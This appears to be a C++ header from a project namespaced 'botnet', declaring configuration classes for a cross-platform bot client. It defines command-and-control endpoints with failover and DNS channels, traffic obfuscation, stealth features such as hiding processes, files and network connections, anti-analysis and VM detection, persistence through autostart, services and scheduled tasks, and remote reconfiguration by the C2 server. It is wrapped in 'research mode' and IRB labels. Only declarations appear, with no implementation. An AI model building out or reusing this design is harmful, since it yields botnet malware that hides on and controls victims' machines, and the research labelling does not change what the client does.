#pragma once

#include <string>
#include <vector>
#include <map>
#include <chrono>
#include <nlohmann/json.hpp>
#include "../../../common/utils/platform_utils.h"

namespace botnet {
namespace client {
namespace config {

/**
 * @brief Comprehensive configuration system - single codebase
 * 
 * Handles all bot configuration for Windows, Linux, and macOS.
 * Supports encrypted storage, dynamic updates, and research mode constraints.
 */
class Configuration {
public:
    // Core bot configuration
    struct BotConfig {
        std::string client_id;
        std::string client_version;
        std::string installation_id;
        bool debug_mode;
        std::string log_level;
        std::chrono::hours max_runtime;
        bool enable_self_update;
    };

    // C2 server configuration
    struct C2Config {
        std::vector<std::string> primary_endpoints;
        std::vector<std::string> fallback_endpoints;
        std::vector<std::string> dns_servers;
        std::string dns_base_domain;
        std::vector<std::string> websocket_endpoints;
        std::chrono::seconds heartbeat_interval;
        std::chrono::seconds reconnect_interval;
        uint32_t max_reconnect_attempts;
        bool enable_failover;
        std::string user_agent;
    };

    // Security configuration
    struct SecurityConfig {
        std::string encryption_key;
        std::string client_certificate;
        std::string client_private_key;
        std::string server_public_key;
        bool verify_ssl_certificates;
        bool enable_certificate_pinning;
        std::vector<std::string> pinned_certificates;
        std::chrono::hours key_rotation_interval;
        bool enable_traffic_obfuscation;
    };

    // Research configuration
    struct ResearchConfig {
        bool research_mode;
        std::string research_session_id;
        std::string compliance_token;
        std::string principal_investigator;
        std::string institution;
        std::string irb_approval_number;
        std::chrono::system_clock::time_point research_expiry;
        std::vector<std::string> approved_commands;
        std::vector<std::string> blocked_operations;
        bool require_explicit_approval;
        bool enable_comprehensive_logging;
    };

    // Stealth configuration (mostly disabled in research mode)
    struct StealthConfig {
        bool enable_stealth;
        bool hide_process;
        bool hide_files;
        bool hide_network_connections;
        bool enable_anti_analysis;
        bool enable_vm_detection;
        std::string process_name;
        std::string service_name;
        std::vector<std::string> stealth_features;
        bool research_mode_override;  // Forces stealth off in research mode
    };

    // Persistence configuration
    struct PersistenceConfig {
        bool enable_persistence;
        bool enable_autostart;
        bool enable_service_installation;
        bool enable_scheduled_tasks;
        std::string install_location;
        std::string service_name;
        std::string service_description;
        std::string autostart_name;
        bool mark_as_research;
    };

    // Operational configuration
    struct OperationalConfig {
        std::chrono::seconds command_timeout;
        uint32_t max_concurrent_commands;
        uint64_t max_memory_usage_mb;
        double max_cpu_usage_percent;
        uint64_t max_network_bandwidth_mbps;
        uint32_t max_file_operations_per_hour;
        bool enable_resource_monitoring;
        std::chrono::minutes monitoring_interval;
    };

    // Logging configuration
    struct LoggingConfig {
        bool enable_local_logging;
        bool enable_remote_logging;
        std::string log_file_path;
        std::string remote_log_endpoint;
        std::string log_level;
        uint64_t max_log_file_size_mb;
        uint32_t max_log_files;
        bool log_to_console;
        bool encrypt_log_files;
        bool enable_research_logging;
    };

public:
    Configuration();
    ~Configuration();

    // Configuration loading and saving
    bool LoadFromFile(const std::string& config_file);
    bool SaveToFile(const std::string& config_file) const;
    bool LoadFromJSON(const nlohmann::json& json);
    nlohmann::json SaveToJSON() const;
    
    // Default configurations
    static Configuration CreateDefaultConfiguration();
    static Configuration CreateResearchConfiguration();
    static Configuration CreateEducationalConfiguration();
    static Configuration CreatePenetrationTestingConfiguration();
    
    // Configuration validation
    bool Validate() const;
    std::vector<std::string> GetValidationErrors() const;
    void ApplyResearchConstraints();
    
    // Configuration access
    const BotConfig& GetBotConfig() const;
    const C2Config& GetC2Config() const;
    const SecurityConfig& GetSecurityConfig() const;
    const ResearchConfig& GetResearchConfig() const;
    const StealthConfig& GetStealthConfig() const;
    const PersistenceConfig& GetPersistenceConfig() const;
    const OperationalConfig& GetOperationalConfig() const;
    const LoggingConfig& GetLoggingConfig() const;
    
    // Configuration updates
    bool UpdateBotConfig(const BotConfig& new_config);
    bool UpdateC2Config(const C2Config& new_config);
    bool UpdateSecurityConfig(const SecurityConfig& new_config);
    bool UpdateResearchConfig(const ResearchConfig& new_config);
    bool UpdateStealthConfig(const StealthConfig& new_config);
    bool UpdatePersistenceConfig(const PersistenceConfig& new_config);
    bool UpdateOperationalConfig(const OperationalConfig& new_config);
    bool UpdateLoggingConfig(const LoggingConfig& new_config);
    
    // Dynamic configuration updates from C2
    bool ApplyConfigurationUpdate(const nlohmann::json& update);
    bool UpdateEndpoints(const std::vector<std::string>& new_endpoints);
    bool UpdateHeartbeatInterval(std::chrono::seconds interval);
    bool UpdateEncryptionKey(const std::string& new_key);
    
    // Research mode enforcement
    void EnableResearchMode(const std::string& session_id, 
                           const std::string& compliance_token);
    void DisableResearchMode();
    bool IsResearchModeEnabled() const;
    bool ValidateResearchConfiguration() const;
    
    // Platform-specific paths
    std::string GetDefaultConfigPath() const;
    std::string GetDefaultLogPath() const;
    std::string GetDefaultInstallPath() const;

private:
    BotConfig bot_config_;
    C2Config c2_config_;
    SecurityConfig security_config_;
    ResearchConfig research_config_;
    StealthConfig stealth_config_;
    PersistenceConfig persistence_config_;
    OperationalConfig operational_config_;
    LoggingConfig logging_config_;
    
    mutable std::vector<std::string> validation_errors_;
    
    // JSON serialization helpers
    nlohmann::json SerializeBotConfig() const;
    nlohmann::json SerializeC2Config() const;
    nlohmann::json SerializeSecurityConfig() const;
    nlohmann::json SerializeResearchConfig() const;
    nlohmann::json SerializeStealthConfig() const;
    nlohmann::json SerializePersistenceConfig() const;
    nlohmann::json SerializeOperationalConfig() const;
    nlohmann::json SerializeLoggingConfig() const;
    
    bool DeserializeBotConfig(const nlohmann::json& json);
    bool DeserializeC2Config(const nlohmann::json& json);
    bool DeserializeSecurityConfig(const nlohmann::json& json);
    bool DeserializeResearchConfig(const nlohmann::json& json);
    bool DeserializeStealthConfig(const nlohmann::json& json);
    bool DeserializePersistenceConfig(const nlohmann::json& json);
    bool DeserializeOperationalConfig(const nlohmann::json& json);
    bool DeserializeLoggingConfig(const nlohmann::json& json);
    
    // Validation helpers
    bool ValidateBotConfig() const;
    bool ValidateC2Config() const;
    bool ValidateSecurityConfig() const;
    bool ValidateResearchConfig() const;
    bool ValidateStealthConfig() const;
    bool ValidatePersistenceConfig() const;
    bool ValidateOperationalConfig() const;
    bool ValidateLoggingConfig() const;
    
    // Platform-specific path helpers
    std::string GetWindowsConfigPath() const;
    std::string GetLinuxConfigPath() const;
    std::string GetMacOSConfigPath() const;
    
    std::string GetWindowsLogPath() const;
    std::string GetLinuxLogPath() const;
    std::string GetMacOSLogPath() const;
    
    std::string GetWindowsInstallPath() const;
    std::string GetLinuxInstallPath() const;
    std::string GetMacOSInstallPath() const;
    
    // Research mode enforcement helpers
    void ApplyResearchModeConstraints();
    void DisableDangerousFeatures();
    void EnableResearchLogging();
    void SetResearchTimeouts();
    
    // Encryption for sensitive configuration data
    bool EncryptSensitiveData();
    bool DecryptSensitiveData();
    std::string EncryptString(const std::string& plaintext) const;
    std::string DecryptString(const std::string& ciphertext) const;
};

/**
 * @brief Configuration manager for dynamic updates and persistence
 */
class ConfigurationManager {
public:
    ConfigurationManager();
    ~ConfigurationManager();

    bool Initialize(const std::string& config_file_path);
    bool LoadConfiguration();
    bool SaveConfiguration();
    bool ReloadConfiguration();
    
    Configuration& GetConfiguration();
    const Configuration& GetConfiguration() const;
    
    // Dynamic updates
    bool ApplyUpdate(const nlohmann::json& update);
    bool UpdateFromC2(const nlohmann::json& c2_update);
    bool ValidateUpdate(const nlohmann::json& update) const;
    
    // Configuration watching
    void EnableConfigurationWatching(bool enabled);
    void SetConfigurationChangeCallback(std::function<void(const Configuration&)> callback);
    
    // Backup and restore
    bool CreateBackup();
    bool RestoreFromBackup(const std::string& backup_file);
    std::vector<std::string> GetAvailableBackups() const;
    
    // Research mode helpers
    bool ApplyResearchConfiguration(const std::string& session_id,
                                   const std::string& compliance_token);
    bool ValidateResearchSetup() const;

private:
    Configuration configuration_;
    std::string config_file_path_;
    
    // Configuration watching
    bool config_watching_enabled_;
    std::unique_ptr<std::thread> config_watcher_thread_;
    std::function<void(const Configuration&)> config_change_callback_;
    std::chrono::system_clock::time_point last_config_modification_;
    
    mutable std::mutex config_mutex_;
    
    void WatchConfigurationFile();
    bool HasConfigurationFileChanged();
    void NotifyConfigurationChange();
    
    std::string GetBackupPath() const;
    std::string GenerateBackupFilename() const;
};

/**
 * @brief Configuration validator for security and compliance
 */
class ConfigurationValidator {
public:
    struct ValidationResult {
        bool is_valid;
        std::vector<std::string> errors;
        std::vector<std::string> warnings;
        std::vector<std::string> security_issues;
        std::vector<std::string> research_compliance_issues;
    };

public:
    static ValidationResult ValidateConfiguration(const Configuration& config);
    static ValidationResult ValidateResearchConfiguration(const Configuration& config);
    static ValidationResult ValidateSecurityConfiguration(const Configuration& config);
    
    // Specific validation functions
    static bool ValidateEndpoints(const std::vector<std::string>& endpoints);
    static bool ValidateEncryptionKey(const std::string& key);
    static bool ValidateCertificate(const std::string& certificate);
    static bool ValidateResearchSession(const std::string& session_id);
    static bool ValidateTimeouts(std::chrono::seconds timeout);
    static bool ValidateResourceLimits(uint64_t memory_mb, double cpu_percent);
    
    // Security validation
    static bool CheckForInsecureSettings(const Configuration& config);
    static bool ValidateSSLConfiguration(const Configuration::SecurityConfig& security_config);
    static bool CheckForWeakEncryption(const Configuration::SecurityConfig& security_config);
    
    // Research compliance validation
    static bool ValidateEthicalCompliance(const Configuration::ResearchConfig& research_config);
    static bool CheckResearchTimeRestrictions(const Configuration::ResearchConfig& research_config);
    static bool ValidateInstitutionalApproval(const Configuration::ResearchConfig& research_config);

private:
    static bool IsValidURL(const std::string& url);
    static bool IsValidIPAddress(const std::string& ip);
    static bool IsValidDomain(const std::string& domain);
    static bool IsValidPort(uint16_t port);
    static bool IsValidFilePath(const std::string& path);
    static bool IsValidTimeRange(std::chrono::seconds min_val, std::chrono::seconds max_val, 
                                std::chrono::seconds actual_val);
    
    static std::vector<std::string> CheckForDangerousSettings(const Configuration& config);
    static std::vector<std::string> CheckForMissingRequiredSettings(const Configuration& config);
    static std::vector<std::string> CheckForResearchModeViolations(const Configuration& config);
};

/**
 * @brief Configuration encryption for sensitive data protection
 */
class ConfigurationEncryption {
public:
    ConfigurationEncryption();
    ~ConfigurationEncryption();

    bool Initialize(const std::string& master_key);
    
    // Encryption/decryption
    std::string EncryptConfigurationData(const std::string& plaintext);
    std::string DecryptConfigurationData(const std::string& ciphertext);
    
    // File encryption
    bool EncryptConfigurationFile(const std::string& input_file, 
                                 const std::string& output_file);
    bool DecryptConfigurationFile(const std::string& input_file, 
                                 const std::string& output_file);
    
    // Key management
    std::string GenerateMasterKey();
    bool DeriveMasterKey(const std::string& password, const std::string& salt);
    bool RotateEncryptionKey();

private:
    std::string master_key_;
    std::unique_ptr<crypto::AESEncryption> encryption_;
    
    std::string DeriveKeyFromPassword(const std::string& password, const std::string& salt);
    std::string GenerateRandomSalt();
};

/**
 * @brief Configuration templates for different use cases
 */
class ConfigurationTemplates {
public:
    // Template creation
    static Configuration CreateMinimalConfiguration();
    static Configuration CreateEducationalConfiguration();
    static Configuration CreateResearchConfiguration();
    static Configuration CreatePenetrationTestingConfiguration();
    static Configuration CreateRedTeamConfiguration();
    static Configuration CreateForensicsConfiguration();
    
    // Template customization
    static Configuration CustomizeForPlatform(const Configuration& base_config);
    static Configuration CustomizeForResearch(const Configuration& base_config,
                                            const std::string& session_id,
                                            const std::string& institution);
    static Configuration CustomizeForEducation(const Configuration& base_config,
                                              const std::string& course_id);
    
    // Template validation
    static bool ValidateTemplate(const Configuration& template_config);
    static std::vector<std::string> GetTemplateRequirements(const std::string& template_name);

private:
    static void ApplyCommonDefaults(Configuration& config);
    static void ApplySecurityDefaults(Configuration& config);
    static void ApplyResearchDefaults(Configuration& config);
    static void ApplyEducationalDefaults(Configuration& config);
    static void ApplyPlatformSpecificDefaults(Configuration& config);
};

/**
 * @brief Configuration deployment helper
 */
class ConfigurationDeployment {
public:
    // Deployment methods
    static bool DeployConfiguration(const Configuration& config, 
                                   const std::string& target_path);
    static bool CreatePortableConfiguration(const Configuration& config,
                                           const std::string& output_path);
    static bool CreateInstallerWithConfiguration(const Configuration& config,
                                                 const std::string& installer_path);
    
    // Cross-platform deployment
    static bool DeployToWindows(const Configuration& config, const std::string& target_path);
    static bool DeployToLinux(const Configuration& config, const std::string& target_path);
    static bool DeployToMacOS(const Configuration& config, const std::string& target_path);
    
    // Research deployment
    static bool DeployResearchConfiguration(const Configuration& config,
                                           const std::string& research_environment_path);
    static bool CreateResearchPackage(const Configuration& config,
                                     const std::string& package_path);

private:
    static bool ValidateDeploymentTarget(const std::string& target_path);
    static bool CreateDeploymentStructure(const std::string& base_path);
    static bool CopyRequiredFiles(const std::string& source_path, const std::string& target_path);
    static bool SetupPlatformSpecificConfiguration(const Configuration& config,
                                                   const std::string& target_path);
};

} // namespace config
} // namespace client
} // namespace botnet
